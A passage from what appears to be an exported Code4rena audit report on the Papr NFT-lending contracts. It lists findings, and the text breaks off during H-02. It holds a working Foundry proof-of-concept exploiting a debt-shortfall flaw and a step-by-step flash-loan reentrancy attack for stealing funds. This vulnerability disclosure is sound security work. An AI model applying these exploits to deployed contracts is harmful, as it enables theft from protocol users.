}\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-4\">High Risk Findings (4)</a></p>\n<ul>\n<li><a href=\"#h-01-borrowers-may-earn-auction-proceeds-without-filling-the-debt-shortfall\">[H-01] Borrowers may earn auction proceeds without filling the debt shortfall</a></li>\n<li><a href=\"#h-02-stealing-fund-by-applying-reentrancy-attack-on-removecollateral-startliquidationauction-and-purchaseliquidationauctionnft\">[H-02] Stealing fund by applying reentrancy attack on <code>removeCollateral</code>, <code>startLiquidationAuction</code>, and <code>purchaseLiquidationAuctionNFT</code></a></li>\n<li><a href=\"#h-03-collateral-nft-deposited-to-a-wrong-address-when-transferred-directly-to-paprcontroller\">[H-03] Collateral NFT deposited to a wrong address, when transferred directly to <code>PaprController</code></a></li>\n<li><a href=\"#h-04-users-may-be-liquidated-right-after-taking-maximal-debt\">[H-04] Users may be liquidated right after taking maximal debt</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-8\">Medium Risk Findings (8)</a></p>\n<ul>\n<li><a href=\"#m-01-missing-deadline-checks-allow-pending-transactions-to-be-maliciously-executed\">[M-01] Missing deadline checks allow pending transactions to be maliciously executed</a></li>\n<li><a href=\"#m-02-disabled-nft-collateral-should-not-be-used-to-mint-debt\">[M-02] Disabled NFT collateral should not be used to mint debt</a></li>\n<li><a href=\"#m-03-grieving-attack-by-failing-users-transactions\">[M-03] Grieving attack by failing user’s transactions</a></li>\n<li><a href=\"#m-04-incorrect-usage-of-safetransferfrom-traps-fees-in-papr-controller\">[M-04] Incorrect usage of safeTransferFrom traps fees in Papr Controller</a></li>\n<li><a href=\"#m-05-paprcontrollerbuyandreducedebt-msgsender-can-lose-paper-by-paying-the-debt-twice\">[M-05] PaprController.buyAndReduceDebt: msg.sender can lose paper by paying the debt twice</a></li>\n<li><a href=\"#m-06-paprcontroller-pays-swap-fee-in-buyandreducedebt-not-user\">[M-06] <code>PaprController</code> pays swap fee in <code>buyAndReduceDebt</code>, not user</a></li>\n<li><a href=\"#m-07-last-collateral-check-is-not-safe\">[M-07] Last collateral check is not safe</a></li>\n<li><a href=\"#m-08-user-fund-loss-because-function-purchaseliquidationauctionnft-takes-extra-liquidation-penalty-when-users-last-collateral-is-liquidated-set-wrong-value-for-maxdebtcached-when-islastcollateral-is-true\">[M-08] User fund loss because function <code>purchaseLiquidationAuctionNFT()</code> takes extra liquidation penalty when user’s last collateral is liquidated, (set wrong value for <code>maxDebtCached</code> when <code>isLastCollateral</code> is true)</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#l-01-current-decay-percentage-could-be-too-high\">L-01 Current decay percentage could be too high</a></li>\n<li><a href=\"#l-02-latestauctionstarttime-can-be-wrongly-set-to-0-even-if-an-nft-is-still-selling-in-auction\">L-02 <code>latestAuctionStartTime</code> can be wrongly set to 0 even if an NFT is still selling in auction</a></li>\n<li><a href=\"#l-03-using-the-30-days-twap-floor-price-of-the-entire-collection-means-that-the-protocol-is-largely-restricted-to-using-the-nfts-that-are-close-to-the-floor-price\">L-03 Using the 30 days TWAP floor price of the entire collection means that the protocol is largely restricted to using the NFTS that are close to the floor price.</a></li>\n<li><a href=\"#l-04-signature-scheme-is-not-checking-that-signeraddress-is-not-0\">L-04 Signature scheme is not checking that <code>signerAddress</code> is not 0</a></li>\n<li><a href=\"#l-05-using-only-the-lowest-price-of-the-nft-of-the-entire-collection-can-be-dangerous\">L-05 Using only the lowest price of the NFT of the entire collection can be dangerous</a></li>\n<li><a href=\"#n-01-more-accurate-to-use--for-validity-of-oracle-timestamp\">N-01 More accurate to use <code>&#x3C;=</code> for validity of oracle timestamp</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#gas-optimizations-summary\">Gas Optimizations Summary</a></li>\n<li><a href=\"#g01--avoid-contract-existence-checks-by-using-low-level-calls\">G‑01  Avoid contract existence checks by using low level calls</a></li>\n<li><a href=\"#g02--internal-functions-only-called-once-can-be-inlined-to-save-gas\">G‑02  <code>internal</code> functions only called once can be inlined to save gas</a></li>\n<li><a href=\"#g03--add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement\">G‑03  Add <code>unchecked {}</code> for subtractions where the operands cannot underflow because of a previous <code>require()</code> or <code>if</code>-statement</a></li>\n<li><a href=\"#g04--keccak256-should-only-need-to-be-called-on-a-specific-string-literal-once\">G‑04  <code>keccak256()</code> should only need to be called on a specific string literal once</a></li>\n<li><a href=\"#g05--optimize-names-to-save-gas\">G‑05  Optimize names to save gas</a></li>\n<li><a href=\"#g06--use-a-more-recent-version-of-solidity\">G‑06  Use a more recent version of Solidity</a></li>\n<li><a href=\"#g07--i-costs-less-gas-than-i-especially-when-its-used-in-for-loops---ii---too\">G‑07  <code>++i</code> costs less gas than <code>i++</code>, especially when it’s used in <code>for</code>-loops (<code>--i</code>/<code>i--</code> too)</a></li>\n<li><a href=\"#g08--usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead\">G‑08  Usage of <code>uints</code>/<code>ints</code> smaller than 32 bytes (256 bits) incurs overhead</a></li>\n<li><a href=\"#g09--using-private-rather-than-public-for-constants-saves-gas\">G‑09  Using <code>private</code> rather than <code>public</code> for constants, saves gas</a></li>\n<li><a href=\"#g10--division-by-two-should-use-bit-shifting\">G‑10  Division by two should use bit shifting</a></li>\n<li><a href=\"#g11--functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable\">G‑11  Functions guaranteed to revert when called by normal users can be marked <code>payable</code></a></li>\n<li><a href=\"#excluded-gas-optimizations-findings\">Excluded Gas Optimizations Findings</a></li>\n<li><a href=\"#g12--using-calldata-instead-of-memory-for-read-only-arguments-in-external-functions-saves-gas\">G‑12  Using <code>calldata</code> instead of <code>memory</code> for read-only arguments in <code>external</code> functions saves gas</a></li>\n<li><a href=\"#g13--state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage\">G‑13  State variables should be cached in stack variables rather than re-reading them from storage</a></li>\n<li><a href=\"#g14--arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop\">G‑14  <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for</code>-loop</a></li>\n<li><a href=\"#g15--using-bools-for-storage-incurs-overhead\">G‑15  Using <code>bool</code>s for storage incurs overhead</a></li>\n<li><a href=\"#g16--using-private-rather-than-public-for-constants-saves-gas\">G‑16  Using <code>private</code> rather than <code>public</code> for constants, saves gas</a></li>\n<li><a href=\"#g17--use-custom-errors-rather-than-revertrequire-strings-to-save-gas\">G‑17  Use custom errors rather than <code>revert()</code>/<code>require()</code> strings to save gas</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>",
  "md": "\n# Overview\n\n## About C4\n\nCode4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.\n\nA C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.\n\nDuring the audit contest outlined in this document, C4 conducted an analysis of the Papr smart contract system written in Solidity. The audit contest took place between December 16—December 21 2022.\n\n## Wardens\n\n64 Wardens contributed reports to the Papr contest:\n\n  1. 0x52\n  2. [0xAgro](https://twitter.com/0xAgro)\n  3. [0xSmartContract](https://twitter.com/0xSmartContract)\n  4. [0xalpharush](https://twitter.com/0xalpharush)\n  5. 0xhacksmithh\n  6. [8olidity](https://twitter.com/8olidity)\n  7. Awesome\n  8. [Aymen0909](https://github.com/Aymen1001)\n  9. Bnke0x0\n  10. Bobface\n  11. Breeje\n  12. Diana\n  13. [Franfran](https://franfran.dev/)\n  14. HE1M\n  15. HollaDieWaldfee\n  16. IllIllI\n  17. [Jeiwan](https://jeiwan.net)\n  18. KingNFT\n  19. Koolex\n  20. Mukund\n  21. RaymondFam\n  22. Rolezn\n  23. [Ruhum](https://twitter.com/0xruhum)\n  24. SaharDevep\n  25. Saintcode\\_\n  26. Secureverse (imkapadia, Nsecv and leosathya)\n  27. SmartSek (0xDjango and hake)\n  28. [TomJ](https://mobile.twitter.com/tomj_bb)\n  29. \\_\\_141345\\_\\_\n  30. ak1\n  31. [bin2chen](https://twitter.com/bin2chen)\n  32. brgltd\n  33. [c3phas](https://twitter.com/c3ph_)\n  34. chrisdior4\n  35. evan\n  36. [eyexploit](https://twitter.com/eyexploit)\n  37. fs0c\n  38. gz627\n  39. [hansfriese](https://twitter.com/hansfriese)\n  40. hihen\n  41. imare\n  42. ladboy233\n  43. lukris02\n  44. noot\n  45. [oyc\\_109](https://twitter.com/andyfeili)\n  46. poirots ([DavideSilva](https://twitter.com/DavideSilva_), resende, naps62 and eighty)\n  47. rbitbytes\n  48. rjs\n  49. rotcivegaf\n  50. rvierdiiev\n  51. [saneryee](https://medium.com/@saneryee-studio)\n  52. shark\n  53. [stealthyz](https://twitter.com/Stealthyzzzz)\n  54. [teawaterwire](https://twitter.com/teawaterwire)\n  55. tnevler\n  56. unforgiven\n  57. wait\n  58. yixxas\n\nThis contest was judged by [trust1995](https://github.com/trust1995).\n\nFinal report assembled by [itsmetechjay](https://twitter.com/itsmetechjay).\n\n# Summary\n\nThe C4 analysis yielded an aggregated total of 12 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 8 received a risk rating in the category of MEDIUM severity.\n\nAdditionally, C4 analysis included 34 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 15 reports recommending gas optimizations.\n\nAll of the issues presented here are linked back to their original finding.\n\n# Scope\n\nThe code under review can be found within the [C4 Papr contest repository](https://github.com/code-423n4/2022-12-backed), and is composed of 5 smart contracts, 4 libraries, and 4 interfaces written in the Solidity programming language and includes 1,043 lines of Solidity code.\n\n# Severity Criteria\n\nC4 assesses the severity of disclosed vulnerabilities according to a methodology based on [OWASP standards](https://owasp.org/www-community/OWASP_Risk_Rating_Methodology).\n\nVulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.\n\nHigh-level considerations for vulnerabilities span the following key areas when conducting assessments:\n\n- Malicious Input Handling\n- Escalation of privileges\n- Arithmetic\n- Gas use\n\nFurther information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com).\n\n# High Risk Findings (4)\n## [[H-01] Borrowers may earn auction proceeds without filling the debt shortfall](https://github.com/code-423n4/2022-12-backed-findings/issues/97)\n*Submitted by [hihen](https://github.com/code-423n4/2022-12-backed-findings/issues/97), also found by [bin2chen](https://github.com/code-423n4/2022-12-backed-findings/issues/214), [rvierdiiev](https://github.com/code-423n4/2022-12-backed-findings/issues/136), and [HollaDieWaldfee](https://github.com/code-423n4/2022-12-backed-findings/issues/70)*\n\nThe proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.\n\n### Proof of Concept\n\nAssume N is an allowed NFT, B is a borrower, the vault V is `_vaultInfo[B][N]`:\n\n1.  B add two NFTs (N-1 and N-2) as collaterals to vault V.\n2.  B [increaseDebt()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138) of vault V.\n3.  The vault V becomes liquidatable.\n4.  Someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-1.\n5.  No one buys N-1 because the price of N is falling.\n6.  After [liquidationAuctionMinSpacing - 2days](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41), someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-2.\n7.  Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:\n\n```solidity\nif (isLastCollateral && remaining != 0) {\n    /// there will be debt left with no NFTs, set it to 0\n    _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n}\n```\n\n8.  Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-2. All the excess will be transferred to B because `neededToSaveVault` is 0 and `debtCached` is 0:\n\n```solidity\nif (excess > 0) {\n    remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);\n}\n```\n\n**The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.**\nTest code for PoC:\n\n```solidity\ndiff --git a/test/paprController/PoC.sol b/test/paprController/PoC.sol\nnew file mode 100644\nindex 0000000..0b12914\n--- /dev/null\n+++ b/test/paprController/PoC.sol\n@@ -0,0 +1,147 @@\n+// SPDX-License-Identifier: GPL-2.0-or-later\n+pragma solidity ^0.8.17;\n+\n+import \"forge-std/console.sol\";\n+import {ERC721} from \"solmate/tokens/ERC721.sol\";\n+\n+import {ReservoirOracleUnderwriter} from \"../../src/ReservoirOracleUnderwriter.sol\";\n+import {INFTEDA} from \"../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol\";\n+\n+import {BasePaprControllerTest} from \"./BasePaprController.ft.sol\";\n+import {IPaprController} from \"../../src/interfaces/IPaprController.sol\";\n+\n+contract PoC is BasePaprControllerTest {\n+    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount);\n+    event Transfer(address indexed from, address indexed to, uint256 amount);\n+\n+    INFTEDA.Auction auction1;\n+    INFTEDA.Auction auction2;\n+    address purchaser = address(2);\n+\n+    function setUp() public override {\n+        super.setUp();\n+\n+        // mint a second collateral\n+        nft.mint(borrower, collateralId+1);\n+        // add collaterals, loan max and sells\n+        _addCollaterals();\n+        _loanMaxAndSell();\n+        // borrower now has 2.9... USD\n+        assertGt(underlying.balanceOf(borrower), 2.9e6);\n+\n+        // prepare purchaser\n+        vm.startPrank(purchaser);\n+        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) - 10;\n+        safeTransferReceivedArgs.proceedsTo = purchaser;\n+        safeTransferReceivedArgs.swapParams.minOut = 0;\n+        for (uint i = 0; i < 3; i ++) {\n+            nft.mint(purchaser, 10+i);\n+            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs));\n+        }\n+        vm.stopPrank();\n+        // purchaser now has 4.4... papr\n+        assertGt(debtToken.balanceOf(purchaser), 4.4e18);\n+\n+        // make max loan liquidatable\n+        vm.warp(block.timestamp + 1 days);\n+        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+    }\n+\n+    function testPoC() public {\n+        vm.startPrank(purchaser);\n+        debtToken.approve(address(controller), type(uint256).max);\n+\n+        // start auction1, collateralId\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo);\n+\n+        // nobody purchage auction1 for some reason(like nft price falling)\n+\n+        // start auction2, collateralId+1\n+        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing());\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        auction2 = controller.startLiquidationAuction(\n+            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo);\n+\n+        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr);\n+        assertGt(info.debt, 2.99e18);\n+\n+        // purchase auction1\n+        uint256 beforeBalance = debtToken.balanceOf(borrower);\n+        uint256 price = controller.auctionCurrentPrice(auction1);\n+        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4;\n+        uint256 reduced = price - penalty;\n+        uint256 shortfall = info.debt - reduced;\n+        // burn penalty\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), penalty);\n+        // reduce debt (partial)\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, reduced);\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), reduced);\n+        //!! burning the shortfall debt not covered by auction\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, shortfall);\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo);\n+\n+        // reduced: 0.65..\n+        assertLt(reduced, 0.66e18);\n+        // fortfall: 2.34..\n+        assertGt(shortfall, 2.34e18);\n+        //!! debt is 0 now\n+        info = controller.vaultInfo(borrower, collateral.addr);\n+        assertEq(info.debt, 0);\n+\n+        // purchase auction2\n+        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29\n+        vm.warp(block.timestamp + 78831);\n+        beforeBalance = debtToken.balanceOf(borrower);\n+        price = controller.auctionCurrentPrice(auction2);\n+        penalty = price * controller.liquidationPenaltyBips() / 1e4;\n+        uint256 payouts = price - penalty;\n+        // burn penalty\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), penalty);\n+        //!! reduce 0 because debt is 0\n+        vm.expectEmit(true, false, false, true);\n+        emit ReduceDebt(borrower, collateral.addr, 0);\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), address(0), 0);\n+        //!! borrower get the payouts that should be used to reduce the shortfall debt\n+        vm.expectEmit(true, true, false, true);\n+        emit Transfer(address(controller), borrower, payouts);\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo);\n+\n+        //!! borrower wins\n+        uint256 afterBalance = debtToken.balanceOf(borrower);\n+        assertEq(afterBalance - beforeBalance, payouts);\n+        assertGt(payouts, 2.4e18);\n+    }\n+\n+    function _addCollaterals() internal {\n+        vm.startPrank(borrower);\n+        nft.setApprovalForAll(address(controller), true);\n+        IPaprController.Collateral[] memory c = new IPaprController.Collateral[](2);\n+        c[0] = collateral;\n+        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft});\n+        controller.addCollateral(c);\n+        vm.stopPrank();\n+    }\n+\n+    function _loanMaxAndSell() internal {\n+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);\n+        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({\n+            amount: controller.maxDebt(oraclePrice*2) - 4,\n+            minOut: 1,\n+            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}),\n+            swapFeeTo: address(0),\n+            swapFeeBips: 0\n+        });\n+        vm.prank(borrower);\n+        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo);\n+    }\n+}\n```\n\nTest output:\n\n    Running 1 test for test/paprController/PoC.sol:PoC\n    [PASS] testPoC() (gas: 720941)\n    Test result: ok. 1 passed; 0 failed; finished in 1.21s\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nThe debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.\n\nImplementation code:\n\n```solidity\ndiff --git a/src/PaprController.sol b/src/PaprController.sol\nindex 284b3f4..d7e4cea 100644\n--- a/src/PaprController.sol\n+++ b/src/PaprController.sol\n@@ -61,6 +61,8 @@ contract PaprController is\n\n     /// @dev account => asset => vaultInfo\n     mapping(address => mapping(ERC721 => IPaprController.VaultInfo)) private _vaultInfo;\n+    /// @dev account => asset => shortfall amount\n+    mapping(address => mapping(ERC721 => uint256)) private _shortfall;\n\n     /// @dev does not validate args\n     /// e.g. does not check whether underlying or oracleSigner are address(0)\n@@ -288,6 +290,8 @@ contract PaprController is\n         }\n\n         if (isLastCollateral && remaining != 0) {\n+            // increase shortfall\n+            _shortfall[auction.nftOwner][auction.auctionAssetContract] += remaining;\n             /// there will be debt left with no NFTs, set it to 0\n             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);\n         }\n@@ -408,6 +412,10 @@ contract PaprController is\n         return _vaultInfo[account][asset];\n     }\n\n+    function shortfall(address account, ERC721 asset) external view returns (uint256) {\n+        return _shortfall[account][asset];\n+    }\n+\n     /// INTERNAL NON-VIEW ///\n\n     function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {\n@@ -543,7 +551,20 @@ contract PaprController is\n             // we owe them more papr than they have in debt\n             // so we pay down debt and send them the rest\n             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), debtCached);\n-            papr.transfer(auction.nftOwner, totalOwed - debtCached);\n+\n+            uint256 payout = totalOwed - debtCached;\n+            uint256 burnShortfall = _shortfall[auction.nftOwner][auction.auctionAssetContract];\n+            if (burnShortfall >= payout) {\n+                burnShortfall = payout;\n+            }\n+            if (burnShortfall > 0) {\n+                // burn the previous shortfall\n+                PaprToken(address(papr)).burn(address(this), burnShortfall);\n+                _shortfall[auction.nftOwner][auction.auctionAssetContract] -= burnShortfall;\n+            }\n+            if (payout > burnShortfall) {\n+                papr.transfer(auction.nftOwner, payout - burnShortfall);\n+            }\n         } else {\n             // reduce vault debt\n             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), totalOwed);\n```\n\n**[Jeiwan (warden) commented](https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1369802651):**\n > State mismanagement causes writing off of a bad debt while there's still a collateral NFT being auctioned. As a result, the proceedings of the auction are not used to repay the bad debt and are sent directly to the debtor.\n\n**[wilsoncusack (Backed) confirmed and commented](https://github.com/code-423n4/2022-12-backed-findings/issues/97#issuecomment-1370080925):**\n > Agree with @Jeiwan. The `isLastCollateral` check should also check whether there is another auction ongoing: https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L525-L527\n\n***\n\n## [[H-02] Stealing fund by applying reentrancy attack on `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`](https://github.com/code-423n4/2022-12-backed-findings/issues/102)\n*Submitted by [HE1M](https://github.com/code-423n4/2022-12-backed-findings/issues/102), also found by [unforgiven](https://github.com/code-423n4/2022-12-backed-findings/issues/242), [hihen](https://github.com/code-423n4/2022-12-backed-findings/issues/195), [rvierdiiev](https://github.com/code-423n4/2022-12-backed-findings/issues/138), and [Bobface](https://github.com/code-423n4/2022-12-backed-findings/issues/63)*\n\nBy applying reentrancy attack involving the functions `removeCollateral`, `startLiquidationAuction`, and `purchaseLiquidationAuctionNFT`, an Attacker can steal large amount of funds.\n\n### Proof of Concept\n\n*   Bob (a malicious user) deploys a contract to apply the attack. This contract is called `BobContract`. Please note that all the following transactions are going to be done in one transaction.\n*   BobContract takes a flash loan of 500K USDC.\n*   BobContract buys 10 NFTs with ids 1 to 10 from collection which are allowed to be used as collateral in this project. Suppose, each NFT has a price of almost 50K USDC.\n*   BobContract adds those NFTs as collateral by calling the function `addCollateral`. So `_vaultInfo[BobContract][collateral.addr].count = 10`.\n\n<!---->\n\n    function addCollateral(IPaprController.Collateral[] calldata collateralArr) external override {\n            for (uint256 i = 0; i < collateralArr.length;) {\n                _addCollateralToVault(msg.sender, collateralArr[i]);\n                collateralArr[i].addr.transferFrom(msg.sender, address(this), collateralArr[i].id);\n                unchecked {\n                    ++i;\n                }\n            }\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L98>\n\n*   BobContract borrows the max allowed amount of `PaprToken` that is almost equivalent to 250K USDC (for simplicity I am assuming target price and mark price are equal to 1 USDC. This assumption does not change the attack scenario at all. It is only to simplify the explanation). This amount is equal to 50% of the collateral amount. It can be done by calling the function `increaseDebt`.\n\n<!---->\n\n    function maxDebt(uint256 totalCollateraValue) external view override returns (uint256) {\n           if (_lastUpdated == block.timestamp) {\n               return _maxDebt(totalCollateraValue, _target);\n           }\n\n           return _maxDebt(totalCollateraValue, newTarget());\n       }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L393>\n\n    function _maxDebt(uint256 totalCollateraValue, uint256 cachedTarget) internal view returns (uint256) {\n            uint256 maxLoanUnderlying = totalCollateraValue * maxLTV;\n            return maxLoanUnderlying / cachedTarget;\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L556>\n\n    function increaseDebt(\n            address mintTo,\n            ERC721 asset,\n            uint256 amount,\n            ReservoirOracleUnderwriter.OracleInfo calldata oracleInfo\n        ) external override {\n            _increaseDebt({account: msg.sender, asset: asset, mintTo: mintTo, amount: amount, oracleInfo: oracleInfo});\n        }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138>\n\n*   BobContract now has 10 NFTs as collateral (worth 500k) and borrowed 10*50k*50% = 250k.\n*   BobContract intends to call the function `removeCollateral`. (In the normal way of working with the protocol, this is not allowed, because by removing even 1 NFT, the debt 250k becomes larger than max allowed collateral 9*50k*50%).\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L109>\n\n*   Here is the trick. BobContract calls this function to remove the NFT with id 1. During the removal in the function `_removeCollateral`, the `safeTransferFrom` callbacks the BobContract.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444>\n\n<https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120>\n\n*   In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).\n*   BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function `startLiquidationAuction` to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and `_vaultInfo[BobContract][collateral.addr].count = 1`. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1*50k*50% = 25k.\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438>\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297>\n\n*   After calling the function `startLiquidationAuction`, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, `info.count = 1`, so debt is larger than max debt.\n\n<!---->\n\n    if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {\n                revert IPaprController.NotLiquidatable();\n            }\n\n<https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317>\n\n*   Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so `_vaultInfo[msg.sender][collateral.addr].count = 0`. Moreover, the starting price for this NFT will be 